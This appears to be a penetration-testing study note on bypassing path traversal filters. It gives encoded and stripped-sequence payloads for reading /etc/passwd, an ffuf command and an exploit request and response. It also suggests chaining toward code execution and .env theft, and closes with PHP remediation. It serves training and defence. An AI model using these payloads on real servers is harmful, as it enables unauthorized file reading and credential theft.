---
tags: [vapt, path-traversal, intermediate, bypass]
difficulty: intermediate
module: "23 - Path Traversal and LFI/RFI"
topic: "23.03 Encoding Bypass for Path Traversal"
portswigger_labs: ["File path traversal, traversal sequences stripped non-recursively", "File path traversal, traversal sequences stripped with superfluous URL-decode"]
---

# 23.03 — Encoding Bypass for Path Traversal

## What is it?
When developers recognize the danger of Path Traversal, they often implement filters to strip or block the `../` sequence. However, if the filter is poorly implemented, it can be bypassed using encoding or non-recursive stripping techniques.

If a filter simply replaces `../` with an empty string, an attacker can use `....//`. When the filter removes the inner `../`, the remaining characters snap together to form a fresh `../`. 

Alternatively, if the filter blocks the literal string `../`, an attacker can URL-encode the characters (e.g., `%2e%2e%2f`). If the web application decodes the input *after* the security check (or if a reverse proxy decodes it before forwarding), the filter is bypassed. Some robust WAFs require double URL encoding (e.g., `%252e%252e%252f`) to trick the system into decoding the payload twice.

Think of it like trying to sneak a prohibited keyword past a text filter. If the filter bans the word "BOMB", you might write "B-O-M-B" or "B0MB" (Encoding), or you might write "BOBOMBMB"—so when the filter removes the inner "BOMB", the outer letters collapse to form the forbidden word again (Non-recursive stripping).

## ASCII Diagram
```text
[Payload: ....//]
   │
[Security Filter (replaces "../" with "")]
   │
   ├─ Sees: ..[../]/
   ├─ Removes inner "../"
   │
[Result: ../] ───> Bypasses filter and traverses directory!

-----------------------------------------------------------

[Payload: %252e%252e%252f] (Double URL Encoded "../")
   │
[Web Server (First Decode)]
   │
   ├─ Decodes %25 to %
   ├─ Result: %2e%2e%2f
   │
[Security Filter]
   │
   ├─ Checks "%2e%2e%2f" against blocklist "../"
   ├─ Doesn't match! (Passes filter)
   │
[Backend Application (Second Decode)]
   │
   ├─ Decodes %2e%2e%2f to ../
   ├─ Result: ../
   │
[File System] ───> Traverses directory!
```

## How to Find It
- **Manual steps:**
  1. Identify a file-fetching parameter (e.g., `?file=report.pdf`).
  2. Test a basic payload (`?file=../../../etc/passwd`).
  3. If the server returns a 403 Forbidden, "Invalid File", or just strips the payload (returning the root directory or failing silently), a filter is in place.
  4. Methodically test bypasses: 
     - Non-recursive: `....//....//....//etc/passwd`
     - URL Encoded: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd`
     - Double URL Encoded: `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd`
  5. If one of the payloads successfully returns the `/etc/passwd` file, the filter has been bypassed.

- **Tool commands with flags explained:**
  To automate the bypass testing, you can use Burp Suite Intruder with a specialized bypass wordlist, or use a tool like `dotdotpwn`:
  ```bash
  # Using ffuf with a specific traversal bypass list
  ffuf -u "https://target.com/download.php?file=FUZZetc/passwd" \
       -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
       -mr "root:x:0:0:"
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Determine which specific encoding tricks the filter.
  2. Construct the full absolute path to your target file using the successful encoding format.
  3. **Note on Base Directories:** Some filters require the payload to *start* with the expected base directory. For example, if it expects `/var/www/images/`, your payload must be `?file=/var/www/images/%252e%252e%252f%252e%252e%252fetc/passwd`.
  4. Submit the request and extract the sensitive data.

- **Actual payloads:**
  **Non-Recursive Stripping:**
  ```text
  ....//....//....//etc/passwd
  ..././..././..././etc/passwd
  ..\..\..\..\ (Windows) -> ....\....\....\....\windows\win.ini
  ```
  **Single URL Encoding:**
  ```text
  %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
  ..%2f..%2f..%2fetc/passwd
  ```
  **Double URL Encoding:**
  ```text
  %252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
  ..%252f..%252f..%252fetc/passwd
  ```
  **16-bit Unicode Encoding (IIS bypass):**
  ```text
  ..%c0%af..%c0%af..%c0%afetc/passwd
  ```

- **Real HTTP request/response examples:**
  **Exploit Request (Double Encoding):**
  ```http
  GET /view?page=..%252f..%252f..%252fetc/passwd HTTP/1.1
  Host: target.com
  ```
  **Exploit Response:**
  ```http
  HTTP/1.1 200 OK
  Content-Type: text/plain
  
  root:x:0:0:root:/root:/bin/bash
  ```

## Real-World Example
In a classic PortSwigger lab scenario, the application prevents path traversal by completely stripping the sequence `../` from the user input before appending it to the base directory. An attacker sends the payload `filename=....//....//....//etc/passwd`. The application's stripping function executes only once. It finds the inner `../` strings and removes them. The remaining characters snap together to form `../../../etc/passwd`. Because the application does not recursively strip the input until it is clean, the attacker successfully bypasses the filter and reads the password file.

## How to Fix It
- **Developer remediation:**
  Never attempt to sanitize input by stripping specific malicious sequences or using regex blocklists. It is mathematically impossible to predict every encoding permutation. Instead, you must resolve the absolute path first, and then validate it.

- **Code snippet:**
  **PHP (Secure Path Resolution using `realpath`):**
  ```php
  $base_dir = '/var/www/html/safe_dir/';
  $user_input = $_GET['file'];
  
  // 1. Construct the path
  $target_path = $base_dir . $user_input;
  
  // 2. Resolve the absolute path (automatically handles ALL encodings and ../)
  // realpath() returns false if the file doesn't exist
  $resolved_path = realpath($target_path);
  
  // 3. Strict prefix check
  if ($resolved_path && strpos($resolved_path, $base_dir) === 0) {
      // Safe to serve the file
      echo file_get_contents($resolved_path);
  } else {
      die("Path Traversal Detected!");
  }
  ```

## Chaining Opportunities
- This vuln + [[07 - LFI to RCE via Log Poisoning]] → If a WAF blocks `../`, use double URL encoding to reach the `/var/log/apache2/access.log` file to execute PHP code you previously injected via the User-Agent header.
- This vuln + [[10 - Chaining Playbook (Database Credentials)]] → Use encoding bypasses to steal `.env` files or backend API keys, bypassing strict edge-node WAFs (like Cloudflare or AWS WAF) that only look for standard `../` patterns.

## Related Notes
- [[01 - What is Path Traversal?]]
- [[02 - Basic Path Traversal (.._.._.._etc_passwd)]]
- [[12 - Defense — Canonicalization, Allowlists, Chroot]]
